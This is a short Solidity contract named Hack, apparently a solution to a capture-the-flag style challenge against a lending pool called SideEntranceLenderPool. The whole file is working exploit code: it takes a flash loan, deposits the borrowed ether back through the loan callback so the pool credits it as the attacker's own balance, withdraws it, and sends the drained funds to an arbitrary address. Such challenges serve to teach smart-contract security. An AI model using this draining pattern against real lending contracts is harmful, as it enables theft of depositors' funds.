// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
import './SideEntranceLenderPool.sol';

contract Hack {
    error CallFailed();
    SideEntranceLenderPool sp;

    constructor(SideEntranceLenderPool x) {
        sp = x;
    }

    function execute() external payable {
        sp.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external payable {
        sp.flashLoan(amount);
        sp.withdraw();
    }

    function transfer(address to) external payable {
        (bool success, ) = to.call{value: address(this).balance}('');
        if (!success) {
            revert CallFailed();
        }
    }

    receive() external payable {}
}
